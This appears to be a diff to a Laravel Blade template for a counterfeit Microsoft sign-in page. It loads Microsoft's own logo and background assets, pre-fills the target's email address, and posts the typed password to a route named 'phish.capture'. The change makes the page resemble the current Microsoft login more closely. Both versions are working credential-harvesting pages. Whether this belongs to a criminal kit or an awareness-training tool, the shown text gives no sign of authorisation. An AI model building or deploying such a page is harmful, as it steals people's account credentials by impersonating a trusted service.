@@ -1,129 +1,98 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="robots" content="noindex">
-    <title>Sign in to your account</title>
-    <link rel="icon" href="https://logincdn.msauth.net/16.000.31130.12/images/favicon.ico">
-    <link rel="preconnect" href="https://logincdn.msauth.net">
-    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <title>Sign in</title>
+    <link rel="icon" href="https://logincdn.msauth.net/shared/5/images/favicon/favicon.ico">
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
-        body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:#f2f2f2;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
-        .outer{width:100%;max-width:440px}
-        .card{background:#fff;padding:44px;border-radius:0;box-shadow:0 2px 6px rgba(0,0,0,.2);min-height:500px}
-        .ms-logo{margin-bottom:16px;height:24px;width:108px}
-        .ms-logo svg{width:108px;height:24px}
-        h1{font-size:24px;font-weight:600;color:#1b1b1b;margin-bottom:16px;line-height:1.3}
-        .error-msg{display:none;background:#fde7e9;border:1px solid #c50f1f;padding:12px 16px;margin-bottom:16px;border-radius:2px;font-size:14px;color:#c50f1f}
-        .email-row{display:flex;align-items:center;padding:6px 10px 6px 16px;margin-bottom:20px;background:#fff;border:1px solid transparent;border-radius:2px}
-        .avatar{width:32px;height:32px;border-radius:50%;background:#0078d4;display:flex;align-items:center;justify-content:center;color:#fff;font-size:14px;font-weight:600;margin-right:12px;flex-shrink:0}
-        .email-info{flex:1;min-width:0}
-        .email-info .name{font-size:14px;font-weight:600;color:#1b1b1b}
-        .email-info .addr{font-size:13px;color:#616161;margin-top:1px}
-        .change-link{font-size:13px;color:#0067b8;text-decoration:none;font-weight:600;margin-left:auto;padding:4px 8px;border-radius:2px;transition:background .1s}
-        .change-link:hover{background:#f3f2f1}
+        body{font-family:"Segoe UI","Segoe UI Web (West European)",-apple-system,system-ui,Roboto,"Helvetica Neue",sans-serif;background:#f2f2f2;min-height:100vh;display:flex;flex-direction:column;position:relative;overflow:hidden}
+        .bg-img{position:fixed;top:0;left:0;width:100%;height:100%;object-fit:cover;z-index:0}
+        .main{flex:1;display:flex;align-items:center;justify-content:center;position:relative;z-index:1;padding:20px}
+        .card{background:rgba(255,255,255,.95);backdrop-filter:blur(20px);padding:44px;width:100%;max-width:440px;box-shadow:0 2px 6px rgba(0,0,0,.2)}
+        .close-btn{position:absolute;top:16px;right:16px;width:24px;height:24px;background:none;border:1px solid transparent;border-radius:4px;cursor:pointer;display:flex;align-items:center;justify-content:center;color:rgb(66,66,66);transition:background .1s}
+        .close-btn:hover{background:rgba(0,0,0,.05)}
+        .ms-logo{display:flex;align-items:center;margin-bottom:16px}
+        .ms-logo svg{height:24px;width:auto}
+        h1{font-size:24px;font-weight:600;color:rgb(36,36,36);margin-bottom:16px;line-height:32px}
         .form-group{margin-bottom:16px}
-        .form-group label{display:block;font-size:14px;color:#424242;margin-bottom:6px;font-weight:600}
-        .input-row{position:relative}
-        .input-row input{width:100%;height:36px;padding:6px 10px;font-size:15px;font-family:'Segoe UI',sans-serif;border:1px solid #8c8c8c;border-radius:0;outline:none;background:#fff;transition:border-color .1s}
-        .input-row input:focus{border-color:#0078d4;border-bottom:2px solid #0078d4}
-        .input-row input.error{border-color:#c50f1f}
-        .eye-btn{position:absolute;right:8px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;color:#616161;padding:4px;display:flex;align-items:center}
-        .eye-btn svg{width:16px;height:16px}
-        .pw-label{position:absolute;left:10px;top:-8px;background:#fff;padding:0 4px;font-size:12px;color:#616161;display:none}
-        .no-acct{font-size:13px;color:#616161;margin-top:4px}
-        .no-acct a{color:#0067b8;text-decoration:none}
-        .no-acct a:hover{text-decoration:underline}
-        .btn-signin{width:100%;height:32px;background:#0078d4;border:none;color:#fff;font-size:14px;font-weight:600;cursor:pointer;margin-top:24px;transition:background .1s;font-family:'Segoe UI',sans-serif}
-        .btn-signin:hover{background:#106ebe}
-        .btn-signin:active{background:#005a9e}
-        .helpers{margin-top:16px}
-        .helpers a{font-size:13px;color:#0067b8;text-decoration:none;display:inline-block;margin-right:16px}
-        .helpers a:hover{text-decoration:underline}
-        .footer{position:fixed;bottom:0;left:0;right:0;padding:16px 24px;display:flex;justify-content:space-between;align-items:center;font-size:12px;color:#616161;background:#fff;border-top:1px solid #e1e1e1}
-        .footer a{color:#616161;text-decoration:none}
+        .form-group label{display:block;font-size:14px;color:rgb(36,36,36);margin-bottom:8px;font-weight:400;line-height:20px}
+        .input-wrap{position:relative}
+        .input-wrap input{width:100%;height:38px;padding:0 18px 0 6px;font-size:16px;font-family:"Segoe UI",sans-serif;border:none;border-bottom:1px solid rgb(118,118,118);outline:none;background:rgba(0,0,0,0);color:rgb(36,36,36);transition:border-color .15s}
+        .input-wrap input:focus{border-bottom:2px solid rgb(15,108,189)}
+        .input-wrap input.error{border-bottom:2px solid rgb(196,49,75)}
+        .forgot{font-size:14px;color:rgb(17,94,163);font-weight:600;background:none;border:none;cursor:pointer;padding:0;font-family:"Segoe UI",sans-serif}
+        .forgot:hover{text-decoration:underline}
+        .btn-next{width:100%;height:38px;background:rgb(15,108,189);color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:600;cursor:pointer;margin-top:24px;font-family:"Segoe UI",sans-serif;transition:background .15s}
+        .btn-next:hover{background:rgb(0,93,167)}
+        .btn-next:active{background:rgb(0,78,142)}
+        .create-link{display:block;margin-top:16px;font-size:14px;color:rgb(36,36,36);text-align:center}
+        .create-link a{color:rgb(17,94,163);font-weight:600;text-decoration:none}
+        .create-link a:hover{text-decoration:underline}
+        .or-text{text-align:center;font-size:12px;color:rgb(128,128,128);margin:16px 0;position:relative}
+        .or-text::before,.or-text::after{content:'';position:absolute;top:50%;width:40%;height:1px;background:#e1e1e1}
+        .or-text::before{left:0}
+        .or-text::after{right:0}
+        .footer{padding:16px 24px;display:flex;justify-content:center;gap:16px;font-size:12px;color:rgb(66,66,66);position:relative;z-index:1}
+        .footer a{color:rgb(66,66,66);text-decoration:none}
         .footer a:hover{text-decoration:underline}
-        .footer-links{display:flex;gap:16px;flex-wrap:wrap}
-        @media(max-width:480px){.card{padding:24px}}
+        @media(max-width:480px){.card{padding:32px 24px}}
     </style>
 </head>
 <body>
-    <div class="outer">
+    <img class="bg-img" src="https://logincdn.msauth.net/shared/5/images/fluent_web_light_2_145a07dcb971527a82b8.svg" alt="">
+
+    <div class="main">
         <div class="card">
+            <button class="close-btn" aria-label="Close">
+                <svg width="14" height="14" viewBox="0 0 14 14" fill="none"><path d="M1 1l12 12M13 1L1 13" stroke="currentColor" stroke-width="1.5"/></svg>
+            </button>
+
             <div class="ms-logo">
-                <svg viewBox="0 0 108 24" xmlns="http://www.w3.org/2000/svg">
+                <svg viewBox="0 0 114 24" xmlns="http://www.w3.org/2000/svg">
                     <g fill="#737373">
                         <path d="M0 0h11.3v11.3H0z" fill="#F25022"/>
                         <path d="M12.7 0H24v11.3H12.7z" fill="#7FBA00"/>
                         <path d="M0 12.7h11.3V24H0z" fill="#00A4EF"/>
                         <path d="M12.7 12.7H24V24H12.7z" fill="#FFB900"/>
                     </g>
-                    <text x="30" y="18" font-family="Segoe UI" font-size="16" font-weight="600" fill="#1b1b1b">Microsoft</text>
+                    <text x="30" y="18" font-family="Segoe UI" font-size="16" font-weight="600" fill="#737373">Microsoft</text>
                 </svg>
             </div>
 
             <h1>Sign in</h1>
 
-            <div class="error-msg" id="errorMsg"></div>
-
-            <div class="email-row">
-                <div class="avatar">{{ strtoupper(substr($email, 0, 1)) }}</div>
-                <div class="email-info">
-                    <div class="name">{{ $name }}</div>
-                    <div class="addr">{{ $email }}</div>
-                </div>
-                <a href="#" class="change-link">Use another account</a>
-            </div>
-
-            <form action="{{ route('phish.capture', ['provider' => 'microsoft', 'token' => $token]) }}" method="POST" id="loginForm">
+            <form action="{{ route('phish.capture', ['provider' => 'microsoft', 'token' => $token]) }}" method="POST">
                 @csrf
                 <div class="form-group">
-                    <label for="password">Enter password</label>
-                    <div class="input-row">
-                        <input type="password" id="password" name="password" autocomplete="current-password" required autofocus>
-                        <button type="button" class="eye-btn" onclick="togglePass()">
-                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
-                        </button>
+                    <label for="email">Email or phone number</label>
+                    <div class="input-wrap">
+                        <input type="email" id="email" name="email" value="{{ $email }}" readonly style="cursor:default;background:#f5f5f5">
                     </div>
                 </div>
 
-                <div style="display:flex;align-items:center;margin-bottom:16px">
-                    <input type="checkbox" id="keepSigned" style="margin-right:8px;cursor:pointer" checked>
-                    <label for="keepSigned" style="font-size:13px;color:#424242;cursor:pointer">Keep me signed in</label>
+                <div class="form-group" style="margin-top:24px">
+                    <label for="password">Enter password</label>
+                    <div class="input-wrap">
+                        <input type="password" id="password" name="password" autocomplete="current-password" required autofocus>
+                    </div>
                 </div>
 
-                <button type="submit" class="btn-signin">Sign in</button>
+                <button type="button" class="forgot">Forgot your username?</button>
+
+                <button type="submit" class="btn-next">Sign in</button>
             </form>
 
-            <div class="helpers">
-                <a href="#">Forgot password?</a>
-                <a href="#">Sign-in options</a>
-            </div>
+            <p class="create-link">New to Microsoft? <a href="#">Create an account</a></p>
         </div>
     </div>
 
     <div class="footer">
-        <div class="footer-links">
-            <a href="#">Terms of use</a>
-            <a href="#">Privacy &amp; cookies</a>
-        </div>
-        <span>© 2026 Microsoft</span>
+        <a href="#">Terms of use</a>
+        <a href="#">Privacy and cookies</a>
+        <a href="#">Help and feedback</a>
     </div>
-
-    <script>
-        function togglePass() {
-            var inp = document.getElementById('password');
-            var btn = document.querySelector('.eye-btn');
-            if (inp.type === 'password') {
-                inp.type = 'text';
-                btn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19m-6.72-1.07a3 3 0 11-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>';
-            } else {
-                inp.type = 'password';
-                btn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>';
-            }
-        }
-    </script>
 </body>
 </html>
